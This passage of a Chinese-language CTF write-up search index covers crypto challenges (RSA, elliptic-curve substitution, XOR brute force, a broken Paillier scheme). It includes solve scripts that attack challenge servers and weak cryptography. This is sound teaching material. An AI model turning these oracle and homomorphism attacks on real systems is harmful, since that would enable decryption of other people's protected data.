msg )) res = [ 0 ] * 20 for i in range ( 20 ): ret = conn . recvline () . decode () if '\ud83d\ude00' in ret : res [ i ] = 1 ans = [] for k , v in hashes . items (): ans . append ( v ) h1 , h2 = k [:: 2 ], k [ 1 :: 2 ] for i in range ( 20 ): if i in range ( 16 ): if res [ i ] and f ' { i : x } ' not in h1 : ans = ans [: - 1 ] break elif not res [ i ] and f ' { i : x } ' in h1 : ans = ans [: - 1 ] break else : if res [ i ] and f ' { ( i - 16 ) : x } ' not in h2 : ans = ans [: - 1 ] break elif not res [ i ] and f ' { ( i - 16 ) : x } ' in h2 : ans = ans [: - 1 ] break conn . sendline ( str ( ans [ 0 ])) ret = conn . recvline () . decode () if '\ud83d\udca1' not in ret : print ( ':(' ) break conn . interactive ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/maybe_someday/#flag","text":"CTF{p4dd1n9_or4cl3_w1th_h0mom0rph1c_pr0p3r7y_c0m6in3d_in7o_a_w31rd_m47h_puzz1e} RFC 3447: Public-Key Cryptography Standards (PKCS) #1: RSA Cryptography Specifications Version 2.1 \u21a9","title":"Flag"},{"location":"crypto/normal_rsa/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u9644\u4ef6\u4e3a\u4e00\u4e2a\u516c\u94a5\u6587\u4ef6 pubkey.pem \u548c\u4e00\u4e2a\u7ecf\u8fc7\u52a0\u5bc6\u7684\u6587\u4ef6 flag.enc \u76f4\u63a5\u4f7f\u7528\u5de5\u5177 Ganapati/RsaCtfTool \u89e3\u5bc6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # factordb \u5728\u7ebf\u5206\u89e3 N $ ./RsaCtfTool.py --publickey pubkey.pem --uncipherfile flag.enc --attack factordb private argument is not set, the private key will not be displayed, even if recovered. [ * ] Testing key pubkey.pem. [ * ] Performing factordb attack on pubkey.pem. Results for pubkey.pem: Unciphered data : HEX : 0x0002c0fe04e3260e5b8700504354467b323536625f69355f6d336469756d7d0a INT ( big endian ) : 4865677769286717240419296208145914517832094464845949055035370987525602570 INT ( little endian ) : 4744739824694533032519230312074638919149793854447671791679980959756701401600 STR : b '\\x00\\x02\\xc0\\xfe\\x04\\xe3&\\x0e[\\x87\\x00PCTF{256b_i5_m3dium}\\n' Flag \u4e3a PCTF{256b_i5_m3dium}","title":"Normal_RSA"},{"location":"crypto/normal_rsa/#_1","text":"\u9644\u4ef6\u4e3a\u4e00\u4e2a\u516c\u94a5\u6587\u4ef6 pubkey.pem \u548c\u4e00\u4e2a\u7ecf\u8fc7\u52a0\u5bc6\u7684\u6587\u4ef6 flag.enc \u76f4\u63a5\u4f7f\u7528\u5de5\u5177 Ganapati/RsaCtfTool \u89e3\u5bc6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # factordb \u5728\u7ebf\u5206\u89e3 N $ ./RsaCtfTool.py --publickey pubkey.pem --uncipherfile flag.enc --attack factordb private argument is not set, the private key will not be displayed, even if recovered. [ * ] Testing key pubkey.pem. [ * ] Performing factordb attack on pubkey.pem. Results for pubkey.pem: Unciphered data : HEX : 0x0002c0fe04e3260e5b8700504354467b323536625f69355f6d336469756d7d0a INT ( big endian ) : 4865677769286717240419296208145914517832094464845949055035370987525602570 INT ( little endian ) : 4744739824694533032519230312074638919149793854447671791679980959756701401600 STR : b '\\x00\\x02\\xc0\\xfe\\x04\\xe3&\\x0e[\\x87\\x00PCTF{256b_i5_m3dium}\\n' Flag \u4e3a PCTF{256b_i5_m3dium}","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/noteasy03/","text":"\u9898\u76ee \u00b6 \u0426\u0435\u0437\u0430\u0440\u044c \u0441\u043a\u0440\u0438\u0432\u0438\u043b\u0441\u044f, \u0417\u0430\u043c\u043a\u043d\u0443\u043b\u0441\u044f \u0432 \u0441\u0435\u0431\u0435. \u041f\u0440\u0435\u0443\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435. Caesar curved, closed in on himself. Multiplication. 1 rzua]o^]tahf]ie]kiho^z]niru]ha^ogn]doak]i[]g[uff]iop^atpe[paz[[tapzetd \u89e3\u9898\u601d\u8def English ver. \u00b6 \u6839\u636e\u9898\u76ee curved / closed in on himself \u548c\u56fe\u7247\uff0c\u63a8\u6d4b\u5e94\u8be5\u662f\u67d0\u79cd\u66f2\u7ebf\uff0c\u4e14\u6240\u6709\u70b9\u5728\u66f2\u7ebf\u4e0a\u90fd\u80fd\u627e\u5230\u5bf9\u5e94\u70b9 \u5206\u6790\u5bc6\u6587\uff0c\u7ed3\u5408 flag \u7684\u683c\u5f0f\uff0c\u5f97\u5230\u4ee5\u4e0b\u6620\u5c04\u5173\u7cfb\u3002\u518d\u7ed3\u5408 Caesar \u63a8\u6d4b\u662f\u5355\u8868\u4ee3\u6362 1 2 3 4 5 r -> u z -> g u -> r a -> a ] -> _ \u6392\u9664\u5e38\u89c1\u7684\u5355\u8868\u4ee3\u6362\u5bc6\u7801\uff08\u90fd\u662f\u7ebf\u6027\u7684\uff09\uff0c\u6700\u540e\u60f3\u5230\u4e86\u692d\u5706\u66f2\u7ebf \u5c3d\u7ba1\u70b9\u5206\u5e03\u7684\u5f62\u72b6\u4f3c\u4e4e\u548c\u5b9e\u6570\u57df\u7684\u692d\u5706\u66f2\u7ebf\u4e0d\u642d\u8fb9\uff0c\u4f46\u82e5\u8003\u8651\u662f\u5728\u6709\u9650\u57df\uff0c\u5219\u56fe\u4e2d\u70b9\u96c6\u5b8c\u5168\u7b26\u5408\u6709\u9650\u57df\u4e2d\u692d\u5706\u66f2\u7ebf\u7684\u7279\u6027 \u540c\u65f6\uff0c\u692d\u5706\u66f2\u7ebf\u4e0a\u70b9\u7684\u9006\u5143\u53ef\u4ee5\u7b26\u5408\u52a0\u89e3\u5bc6\u7684\u6620\u5c04\u9700\u6c42 \u6839\u636e\u5404\u70b9\u5750\u6807\u5927\u5c0f\u53ef\u63a8\u51fa\u6709\u9650\u57df\u5927\u5c0f\u4e3a \\(31\\) \u901a\u8fc7 \u5728\u7ebf\u692d\u5706\u66f2\u7ebf\u53ef\u89c6\u5316\u5de5\u5177 \u5bfb\u627e\u692d\u5706\u66f2\u7ebf\u7cfb\u6570\u7684\u5927\u81f4\u8303\u56f4 \u5173\u952e\u7279\u5f81\uff1a\u4e09\u4e2a\u70b9\u4f4d\u4e8e \\(x\\) \u8f74\uff0c\u4e00\u4e2a\u70b9\u4f4d\u4e8e \\((0, 0)\\) \u518d\u7ed3\u5408\u6709\u9650\u57df\u548c\u5df2\u77e5\u70b9\u7684\u5750\u6807\u786e\u5b9a\u692d\u5706\u66f2\u7ebf\u7cfb\u6570 \\(a=-5,b=0\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from Crypto.Util.number import * ps = [( 0 , 0 ), ( 5 , 10 ), ( 5 , 21 ), ( 6 , 0 ), ( 8 , 10 ), ( 8 , 21 ), ( 9 , 8 ), ( 9 , 23 ), ( 10 , 12 ), ( 10 , 19 ), ( 11 , 6 ), ( 11 , 25 ), ( 12 , 5 ), ( 12 , 26 ), ( 14 , 15 ), ( 14 , 16 ), ( 15 , 13 ), ( 15 , 18 ), ( 18 , 10 ), ( 18 , 21 ), ( 24 , 8 ), ( 24 , 23 ), ( 25 , 0 ), ( 27 , 7 ), ( 27 , 24 ), ( 28 , 9 ), ( 28 , 22 ), ( 29 , 8 ), ( 29 , 23 ), ( 30 , 2 ), ( 30 , 29 )] for a in range ( - 5 , 0 ): for b in range ( - 4 , 5 ): if 4 * a ** 3 + 27 * b ** 2 : E = EllipticCurve ( Zmod ( 31 ), [ a , b ]) else : continue f = 1 for p in ps : try : E ( p [ 0 ], p [ 1 ]) except : f = 0 break if f : print ( a , b ) \u6839\u636e Caesar \u548c Multiplication \u63a8\u6d4b\u70b9\u7684\u6620\u5c04\u4e3a\u692d\u5706\u66f2\u7ebf\u4e2d\u7684\u70b9\u4e58\uff0c\u7cfb\u6570\u4e3a \\(3\\) \uff0c\u7136\u800c\u89e3\u5bc6\u7684\u7ed3\u679c\u662f\u4e00\u5806\u4e71\u7801 :( \u6700\u65e9\u7684\u51ef\u6492\u5bc6\u7801\u4e3a\u79fb \\(3\\) \u4f4d\uff0c\u540e\u6765\u6269\u5c55\u4e3a\u79fb\u4f4d\u5bc6\u7801\u3002\u4e8e\u662f\u5c1d\u8bd5\u6539\u53d8\u7cfb\u6570\uff0c\u5f53\u7cfb\u6570\u4e3a \\(11\\) \u65f6\u6210\u529f\u83b7\u5f97 Flag XD 1 2 3 4 5 6 7 8 9 10 11 12 13 from Crypto.Util.number import * cipher = 'rzua]o^]tahf]ie]kiho^z]niru]ha^ogn]doak]i[]g[uff]iop^atpe[paz[[tapzetd' E = EllipticCurve ( Zmod ( 31 ), [ - 5 , 0 ]) d = { E ( 0 , 0 ): 'a' , E ( 5 , 10 ): 'b' , E ( 5 , 21 ): 'c' , E ( 6 , 0 ): 'd' , E ( 8 , 10 ): 'e' , E ( 8 , 21 ): 'f' , E ( 9 , 8 ): 'g' , E ( 9 , 23 ): 'h' , E ( 10 , 12 ): 'i' , E ( 10 , 19 ): 'j' , E ( 11 , 6 ): 'k' , E ( 11 , 25 ): 'l' , E ( 12 , 5 ): 'm' , E ( 12 , 26 ): 'n' , E ( 14 , 15 ): 'o' , E ( 14 , 16 ): 'p' , E ( 15 , 13 ): 'q' , E ( 15 , 18 ): 'r' , E ( 18 , 10 ): 's' , E ( 18 , 21 ): 't' , E ( 24 , 8 ): 'u' , E ( 24 , 23 ): 'v' , E ( 25 , 0 ): 'w' , E ( 27 , 7 ): 'x' , E ( 27 , 24 ): 'y' , E ( 28 , 9 ): 'z' , E ( 28 , 22 ): '[' , E ( 29 , 8 ): ' \\\\ ' , E ( 29 , 23 ): ']' , E ( 30 , 2 ): '^' , E ( 30 , 29 ): '_' } res = dict () for k , v in d . items (): res [ v ] = d [ 11 * k ] for c in cipher : print ( res [ c ], end = '' ) Flag \u00b6 ugra_in_case_of_losing_your_sanity_dial_oh_three_oijnacjfhjaghhcajgfcd","title":"noteasy03"},{"location":"crypto/noteasy03/#_1","text":"\u0426\u0435\u0437\u0430\u0440\u044c \u0441\u043a\u0440\u0438\u0432\u0438\u043b\u0441\u044f, \u0417\u0430\u043c\u043a\u043d\u0443\u043b\u0441\u044f \u0432 \u0441\u0435\u0431\u0435. \u041f\u0440\u0435\u0443\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435. Caesar curved, closed in on himself. Multiplication. 1 rzua]o^]tahf]ie]kiho^z]niru]ha^ogn]doak]i[]g[uff]iop^atpe[paz[[tapzetd","title":"\u9898\u76ee"},{"location":"crypto/noteasy03/#english-ver","text":"\u6839\u636e\u9898\u76ee curved / closed in on himself \u548c\u56fe\u7247\uff0c\u63a8\u6d4b\u5e94\u8be5\u662f\u67d0\u79cd\u66f2\u7ebf\uff0c\u4e14\u6240\u6709\u70b9\u5728\u66f2\u7ebf\u4e0a\u90fd\u80fd\u627e\u5230\u5bf9\u5e94\u70b9 \u5206\u6790\u5bc6\u6587\uff0c\u7ed3\u5408 flag \u7684\u683c\u5f0f\uff0c\u5f97\u5230\u4ee5\u4e0b\u6620\u5c04\u5173\u7cfb\u3002\u518d\u7ed3\u5408 Caesar \u63a8\u6d4b\u662f\u5355\u8868\u4ee3\u6362 1 2 3 4 5 r -> u z -> g u -> r a -> a ] -> _ \u6392\u9664\u5e38\u89c1\u7684\u5355\u8868\u4ee3\u6362\u5bc6\u7801\uff08\u90fd\u662f\u7ebf\u6027\u7684\uff09\uff0c\u6700\u540e\u60f3\u5230\u4e86\u692d\u5706\u66f2\u7ebf \u5c3d\u7ba1\u70b9\u5206\u5e03\u7684\u5f62\u72b6\u4f3c\u4e4e\u548c\u5b9e\u6570\u57df\u7684\u692d\u5706\u66f2\u7ebf\u4e0d\u642d\u8fb9\uff0c\u4f46\u82e5\u8003\u8651\u662f\u5728\u6709\u9650\u57df\uff0c\u5219\u56fe\u4e2d\u70b9\u96c6\u5b8c\u5168\u7b26\u5408\u6709\u9650\u57df\u4e2d\u692d\u5706\u66f2\u7ebf\u7684\u7279\u6027 \u540c\u65f6\uff0c\u692d\u5706\u66f2\u7ebf\u4e0a\u70b9\u7684\u9006\u5143\u53ef\u4ee5\u7b26\u5408\u52a0\u89e3\u5bc6\u7684\u6620\u5c04\u9700\u6c42 \u6839\u636e\u5404\u70b9\u5750\u6807\u5927\u5c0f\u53ef\u63a8\u51fa\u6709\u9650\u57df\u5927\u5c0f\u4e3a \\(31\\) \u901a\u8fc7 \u5728\u7ebf\u692d\u5706\u66f2\u7ebf\u53ef\u89c6\u5316\u5de5\u5177 \u5bfb\u627e\u692d\u5706\u66f2\u7ebf\u7cfb\u6570\u7684\u5927\u81f4\u8303\u56f4 \u5173\u952e\u7279\u5f81\uff1a\u4e09\u4e2a\u70b9\u4f4d\u4e8e \\(x\\) \u8f74\uff0c\u4e00\u4e2a\u70b9\u4f4d\u4e8e \\((0, 0)\\) \u518d\u7ed3\u5408\u6709\u9650\u57df\u548c\u5df2\u77e5\u70b9\u7684\u5750\u6807\u786e\u5b9a\u692d\u5706\u66f2\u7ebf\u7cfb\u6570 \\(a=-5,b=0\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from Crypto.Util.number import * ps = [( 0 , 0 ), ( 5 , 10 ), ( 5 , 21 ), ( 6 , 0 ), ( 8 , 10 ), ( 8 , 21 ), ( 9 , 8 ), ( 9 , 23 ), ( 10 , 12 ), ( 10 , 19 ), ( 11 , 6 ), ( 11 , 25 ), ( 12 , 5 ), ( 12 , 26 ), ( 14 , 15 ), ( 14 , 16 ), ( 15 , 13 ), ( 15 , 18 ), ( 18 , 10 ), ( 18 , 21 ), ( 24 , 8 ), ( 24 , 23 ), ( 25 , 0 ), ( 27 , 7 ), ( 27 , 24 ), ( 28 , 9 ), ( 28 , 22 ), ( 29 , 8 ), ( 29 , 23 ), ( 30 , 2 ), ( 30 , 29 )] for a in range ( - 5 , 0 ): for b in range ( - 4 , 5 ): if 4 * a ** 3 + 27 * b ** 2 : E = EllipticCurve ( Zmod ( 31 ), [ a , b ]) else : continue f = 1 for p in ps : try : E ( p [ 0 ], p [ 1 ]) except : f = 0 break if f : print ( a , b ) \u6839\u636e Caesar \u548c Multiplication \u63a8\u6d4b\u70b9\u7684\u6620\u5c04\u4e3a\u692d\u5706\u66f2\u7ebf\u4e2d\u7684\u70b9\u4e58\uff0c\u7cfb\u6570\u4e3a \\(3\\) \uff0c\u7136\u800c\u89e3\u5bc6\u7684\u7ed3\u679c\u662f\u4e00\u5806\u4e71\u7801 :( \u6700\u65e9\u7684\u51ef\u6492\u5bc6\u7801\u4e3a\u79fb \\(3\\) \u4f4d\uff0c\u540e\u6765\u6269\u5c55\u4e3a\u79fb\u4f4d\u5bc6\u7801\u3002\u4e8e\u662f\u5c1d\u8bd5\u6539\u53d8\u7cfb\u6570\uff0c\u5f53\u7cfb\u6570\u4e3a \\(11\\) \u65f6\u6210\u529f\u83b7\u5f97 Flag XD 1 2 3 4 5 6 7 8 9 10 11 12 13 from Crypto.Util.number import * cipher = 'rzua]o^]tahf]ie]kiho^z]niru]ha^ogn]doak]i[]g[uff]iop^atpe[paz[[tapzetd' E = EllipticCurve ( Zmod ( 31 ), [ - 5 , 0 ]) d = { E ( 0 , 0 ): 'a' , E ( 5 , 10 ): 'b' , E ( 5 , 21 ): 'c' , E ( 6 , 0 ): 'd' , E ( 8 , 10 ): 'e' , E ( 8 , 21 ): 'f' , E ( 9 , 8 ): 'g' , E ( 9 , 23 ): 'h' , E ( 10 , 12 ): 'i' , E ( 10 , 19 ): 'j' , E ( 11 , 6 ): 'k' , E ( 11 , 25 ): 'l' , E ( 12 , 5 ): 'm' , E ( 12 , 26 ): 'n' , E ( 14 , 15 ): 'o' , E ( 14 , 16 ): 'p' , E ( 15 , 13 ): 'q' , E ( 15 , 18 ): 'r' , E ( 18 , 10 ): 's' , E ( 18 , 21 ): 't' , E ( 24 , 8 ): 'u' , E ( 24 , 23 ): 'v' , E ( 25 , 0 ): 'w' , E ( 27 , 7 ): 'x' , E ( 27 , 24 ): 'y' , E ( 28 , 9 ): 'z' , E ( 28 , 22 ): '[' , E ( 29 , 8 ): ' \\\\ ' , E ( 29 , 23 ): ']' , E ( 30 , 2 ): '^' , E ( 30 , 29 ): '_' } res = dict () for k , v in d . items (): res [ v ] = d [ 11 * k ] for c in cipher : print ( res [ c ], end = '' )","title":"\u89e3\u9898\u601d\u8def English ver."},{"location":"crypto/noteasy03/#flag","text":"ugra_in_case_of_losing_your_sanity_dial_oh_three_oijnacjfhjaghhcajgfcd","title":"Flag"},{"location":"crypto/opisthocomus_hoazin/","text":"\u9898\u76ee \u00b6 The plural of calculus is calculi. \u89e3\u9898\u601d\u8def \u00b6 \u5df2\u77e5 n \u3001 e \u548c flag \u6bcf\u4e00\u4f4d ASCII \u503c\u4e0e e \u5f02\u6216\u6a21 n \u7684\u7ed3\u679c\u6570\u7ec4 1 2 3 4 5 6 7 8 9 10 11 12 from Crypto.Util.number import * flag = open ( 'flag.txt' , 'r' ) . read () p = getPrime ( 1024 ) q = getPrime ( 1024 ) e = 2 ** 16 + 1 n = p * q ct = [] for ch in flag : ct . append (( ord ( ch ) ^ e ) % n ) print ( n ) print ( e ) print ( ct ) \u770b\u5230 n \u548c e \u611f\u89c9\u5f88 RSA\uff0c\u7136\u800c\u7531\u4e8e ASCII \u7801\u53d6\u503c\u8303\u56f4\u4e3a \\([0,127]\\) \uff0c\u76f4\u63a5\u66b4\u529b\u5c31\u53ef\u4ee5\u4e86\uff01 1 2 3 4 for i in ct : for j in range ( 128 ): if ( j ^ e ) % n == i : print ( chr ( j ), end = \"\" )","title":"opisthocomus-hoazin"},{"location":"crypto/opisthocomus_hoazin/#_1","text":"The plural of calculus is calculi.","title":"\u9898\u76ee"},{"location":"crypto/opisthocomus_hoazin/#_2","text":"\u5df2\u77e5 n \u3001 e \u548c flag \u6bcf\u4e00\u4f4d ASCII \u503c\u4e0e e \u5f02\u6216\u6a21 n \u7684\u7ed3\u679c\u6570\u7ec4 1 2 3 4 5 6 7 8 9 10 11 12 from Crypto.Util.number import * flag = open ( 'flag.txt' , 'r' ) . read () p = getPrime ( 1024 ) q = getPrime ( 1024 ) e = 2 ** 16 + 1 n = p * q ct = [] for ch in flag : ct . append (( ord ( ch ) ^ e ) % n ) print ( n ) print ( e ) print ( ct ) \u770b\u5230 n \u548c e \u611f\u89c9\u5f88 RSA\uff0c\u7136\u800c\u7531\u4e8e ASCII \u7801\u53d6\u503c\u8303\u56f4\u4e3a \\([0,127]\\) \uff0c\u76f4\u63a5\u66b4\u529b\u5c31\u53ef\u4ee5\u4e86\uff01 1 2 3 4 for i in ct : for j in range ( 128 ): if ( j ^ e ) % n == i : print ( chr ( j ), end = \"\" )","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/paiaiai/","text":"\u9898\u76ee \u00b6 Pai-ai-ai\u2026 My Paillier scheme seems to be broken and I stored my favourite flag in it. Please help me get it back, will you? Who could have guessed this would ever happen? \u2026 Me\u2026 I- I wrote it\u2026 yeah. 1 nc cha.hackpack.club 10997 # or 20997 paiaiai.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 #!/usr/bin/env python3 # # Polymero # # Imports from Crypto.Util.number import getPrime , inverse from secrets import randbelow # Local imports with open ( \"flag.txt\" , 'rb' ) as f : FLAG = f . read () . decode () f . close () # Just for you sanity assert len ( FLAG ) > 64 MENU = r \"\"\"| | MENU: | [E]ncrypt | [D]ecrypt | [Q]uit |\"\"\" class Paiaiai : \"\"\" My first Paillier implementation! So proud of it. ^ w ^ \"\"\" def __init__ ( self ): # Key generation p , q = [ getPrime ( 512 ) for _ in range ( 2 )] n = p * q # Public key self . pub = { 'n' : n , 'gp' : pow ( randbelow ( n ** 2 ), p , n ** 2 ), 'gq' : pow ( randbelow ( n ** 2 ), q , n ** 2 ) } # Private key self . priv = { 'la' : ( p - 1 ) * ( q - 1 ), 'mu' : inverse (( pow ( self . pub [ 'gp' ] * self . pub [ 'gq' ], ( p - 1 ) * ( q - 1 ), n ** 2 ) - 1 ) // n , n ) } def encrypt ( self , m : str ): m_int = int . from_bytes ( m . encode (), 'big' ) g = pow ([ self . pub [ 'gp' ], self . pub [ 'gq' ]][ randbelow ( 2 )], m_int , self . pub [ 'n' ] ** 2 ) r = pow ( randbelow ( self . pub [ 'n' ]), self . pub [ 'n' ], self . pub [ 'n' ] ** 2 ) return ( g * r ) % self . pub [ 'n' ] ** 2 def decrypt ( self , c : int ): cl = ( pow ( c , self . priv [ 'la' ], self . pub [ 'n' ] ** 2 ) - 1 ) // self . pub [ 'n' ] return ( cl * self . priv [ 'mu' ]) % self . pub [ 'n' ] pai = Paiaiai () while True : try : print ( MENU ) choice = input ( \"| >>> \" ) . lower () . strip () if choice == 'e' : print ( \"| \\n | ENCRYPT:\" ) print ( \"| [F]lag\" ) print ( \"| [M]essage\" ) subchoice = input ( \"| \\n | >>> \" ) . lower () . strip () if subchoice == 'f' : enc_flag = pai . encrypt ( FLAG ) print ( \"| \\n | FLAG:\" , enc_flag ) elif subchoice == 'm' : msg = input ( \"| \\n | MSG: str \\n | > \" ) cip = pai . encrypt ( msg ) print ( \"| \\n | CIP:\" , cip ) elif choice == 'd' : cip = input ( \"| \\n | CIP: int \\n | > \" ) msg = pai . decrypt ( int ( cip )) print ( \"| \\n | MSG:\" , msg ) elif choice == 'q' : print ( \"| \\n | Bai ~ \\n |\" ) break else : print ( \"| \\n | Trai again ~ \\n |\" ) except ( KeyboardInterrupt , EOFError ): print ( \" \\n | \\n | Bai ~ \\n |\" ) break except : print ( \"| \\n | Aiaiai ~ \\n |\" ) \u89e3\u9898\u601d\u8def \u00b6 server \u540c\u65f6\u63d0\u4f9b\u4e86\u52a0\u5bc6\u548c\u89e3\u5bc6\u7684\u529f\u80fd\uff0c\u4f46\u662f\u89e3\u5bc6\u7ed3\u679c\u663e\u7136\u662f\u4e0d\u5bf9\u7684 (\u2565\u03c9\u2565) \u5982\u679c\u6211\u4eec\u52a0\u5bc6 test \u5e76\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4ea4\u7ed9\u670d\u52a1\u5668\u89e3\u5bc6\uff0c\u90a3\u4e48\u4f1a\u6536\u5230\u4e00\u4e32\u4e71\u7801\uff08\u4ee5\u4e0b\u7ed3\u679c\u7ecf\u8fc7 long_to_bytes \u5904\u7406\uff09 1 b \"6\\xa2\\x15\\x816\\x12'\\x8f\\xdc[v\\xb6\\xe4]2\\xfc\\xfc\\x13_\\xc3\\xe3\\xc7A\\xddF:f\\x1d\\xd4\\xe8A\\x92`V\\xf8\\xfe)4\\xb1DS\\xcc\\xe7\\xf6&\\x93\\x8b\\xee()/7\\xd4\\xb9=`\\xc80\\x95\\xb5\\x00\\xc1h\\x1f\\xc5\\xab\\xb7\\x9b\\x03\\x8c\\xbd[\\xd8\\xf8\\x81\\x8ek\\x00\\xd0\\xe0v\\x03l\\xfa\\x872h\\xd0.C\\xa1D\\xa8\\xc8\\xc7a\\xe5\\xd5_\\xd0\\x91\\xe8\\x8b\\xeb\\xb8\\x17Zd\\xb8\\xe7j\\x14\\xc6^\\xdd\\xa1\\x80\\xb4kT $j \\xc9\\xe6e`\\x8e\\x00\" \u5206\u6790 paiaiai.py \u4e2d Paillier \u7684\u5b9e\u73b0 Paiaiai Paiaiai \u00b6 Paiaiai \u52a0\u89e3\u5bc6\u8fc7\u7a0b\u4e0e\u539f Paillier \u7b97\u6cd5\u57fa\u672c\u4e00\u81f4\uff0c\u4f46\u4fee\u6539\u4e86\u516c\u79c1\u94a5\u7684\u751f\u6210\u65b9\u5f0f \u516c\u94a5\u4e3a \\((n,g_p,g_q)\\) \u79c1\u94a5\u4e3a \\((\\lambda, \\mu)\\) \uff0c\u5176\u4e2d \\(\\lambda=(p-1)(q-1),\\mu=(L((g_p\\times g_q)^\\lambda\\ mod\\ n^2))^{-1}(mod\\ n)\\) \u52a0\u5bc6 \u00b6 \u968f\u673a\u9009\u62e9 \\(g_p\\) \u548c \\(g_q\\) \u4f5c\u4e3a \\(g\\) \u4e24\u79cd\u53ef\u80fd\u7684\u5bc6\u6587 \\(c_p=g_p^m\\cdot r^n\\ mod\\ n^2\\) \\(c_q=g_q^m\\cdot r^n\\ mod\\ n^2\\) \u89e3\u5bc6 \u00b6 \\(D(c)=L(c^\\lambda\\ mod\\ n^2)\\cdot\\mu\\) \\(=\\frac{L(c^\\lambda\\ mod\\ n^2)}{L((g_p\\times g_q)^\\lambda\\ mod\\ n^2)}\\ mod\\ n\\) \\(\\because \\lambda=(p-1)(q-1)=\\varphi(n)\\) \\(\\therefore g^\\lambda\\equiv 1(mod\\ n),g^\\lambda(mod\\, n^2)\\equiv 1(mod\\, n)\\) \\(\\therefore g^\\lambda(mod\\, n^2)=nk_g+1,k_g<n\\) \\(\\therefore L(g^\\lambda(mod\\, n^2))=k_g\\) \u8bbe \\(L(g_p^\\lambda(mod\\ n^2))=k_p,L(g_q^\\lambda(mod\\ n^2))=k_q\\) \\(\\therefore L(c_p^{\\lambda}\\, mod\\, n^2)=mk_p,L(c_q^{\\lambda}\\, mod\\, n^2)=mk_q\\) \\(\\because\\) \\(\\begin{equation} \\begin{split} (g_p\\times g_q)^\\lambda\\ mod\\ n^2 & =(nk_p+1)(nk_q+1) \\\\ & = n^2k_pk_q+nk_p+nk_q+1 \\\\ & \\equiv nk_p+nk_q+1(mod\\ n^2) \\end{split} \\end{equation}\\) \\(\\therefore L((g_p\\times g_q)^\\lambda\\ mod\\ n^2)=k_p+k_q\\) \\(\\therefore m(k_p+k_q)=L((c_p\\times c_q)^\\lambda mod\\ n^2)\\) \\(\\therefore m=D(c_p)+D(c_q)=\\frac{mk_p}{k_p+k_q}+\\frac{mk_q}{k_p+k_q}=\\frac{m(k_p+k_q)}{k_p+k_q}=D(c_p\\times c_q)(mod\\ n)\\) \u867d\u7136 \\(n\\) \u662f Paillier \u516c\u94a5\u7684\u4e00\u90e8\u5206\uff0c\u4f46 Paiaiai \u6ca1\u6709\u63d0\u4f9b\u83b7\u53d6\u63a5\u53e3\uff0c\u56e0\u800c\u5c06 \\(D(c_p)+D(c_q)\\) \u6839\u636e\u52a0\u6cd5\u540c\u6001\u6027\u8f6c\u5316\u4e3a \\(D(c_p\\times c_q)\\) \u5e76\u4ea4\u7531\u670d\u52a1\u5668\u89e3\u5bc6 Exploitation \u00b6 \u9996\u5148\u83b7\u53d6 Flag \u5206\u522b\u4f7f\u7528 \\(g_p\\) \u548c \\(g_q\\) \u52a0\u5bc6\u7684\u7ed3\u679c \\(c_p,c_q\\) \uff08\u7531\u4e8e\u52a0\u5bc6\u65f6\u968f\u673a\u6570 \\(r\\) \u7684\u5b58\u5728\uff0c\u9700\u8981\u89e3\u5bc6\u540e\u624d\u80fd\u5224\u65ad\uff09 \u89e3\u5bc6 \\(c_p\\times c_q\\) \u5373\u53ef\u83b7\u5f97 Flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from Crypto.Util.number import long_to_bytes import pwn conn = pwn . remote ( \"cha.hackpack.club\" , 10997 ) cipher = dict () for _ in range ( 5 ): conn . sendafter ( '>>> ' , 'e \\n ' ) conn . sendafter ( '>>> ' , 'f \\n ' ) c = conn . recvline_contains ( 'FLAG: ' ) . decode () c = c [ c . find ( ': ' ) + 2 :] conn . sendafter ( '>>> ' , 'd \\n ' ) conn . sendafter ( '> ' , c + ' \\n ' ) x = conn . recvline_contains ( 'MSG: ' ) . decode () x = int ( x [ x . find ( ': ' ) + 2 :]) cipher [ x ] = int ( c ) if len ( cipher ) == 2 : # got 2 different ciphertexts break cipher = cipher . values () conn . sendafter ( '>>> ' , 'd \\n ' ) conn . sendafter ( '> ' , str ( cipher [ 0 ] * cipher [ 1 ]) + ' \\n ' ) m = conn . recvline_contains ( 'MSG: ' ) . decode () m = int ( m [ m . find ( ': ' ) + 2 :]) print ( long_to_bytes ( m )) # b'________flag{p41_41_41_1_d0nt_th1nk_th1s_1s_wh4t_p41ll13r_1nt3nd3d_3h}________' Flag \u00b6 flag{p41_41_41_1_d0nt_th1nk_th1s_1s_wh4t_p41ll13r_1nt3nd3d_3h} Paillier \u00b6 \u5bc6\u94a5\u751f\u6210 \u00b6 \u968f\u673a\u9009\u62e9\u4e24\u4e2a\u5927\u7d20\u6570 \\(p,q\\) \uff0c\u4fdd\u8bc1 \\(gcd(pq,(p-1)(q-1))=1\\) \u8ba1\u7b97 \\(n=pq\\) \uff0c \\(\\lambda=lcm(p-1,q-1)\\) \u968f\u673a\u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e \\(n^2\\) \u7684\u6b63\u6574\u6570 \\(g\\) \uff0c\u4e14\u5b58\u5728 \\(\\mu=(L(g^{\\lambda}\\ mod\\ n^2))^{-1}mod\\, n\\) \u5176\u4e2d\uff0c \\(L(x)=\\frac{x-1}{n}\\) \uff08\u6b64\u5904\u5206\u5f0f\u4e3a\u9664\u6cd5\uff09 \u516c\u94a5\u4e3a \\((n,g)\\) \uff0c\u79c1\u94a5\u4e3a \\((\\lambda,\\mu)\\) \u7b80\u5355\u53d8\u79cd \u00b6 \u5728 \\(p,q\\) 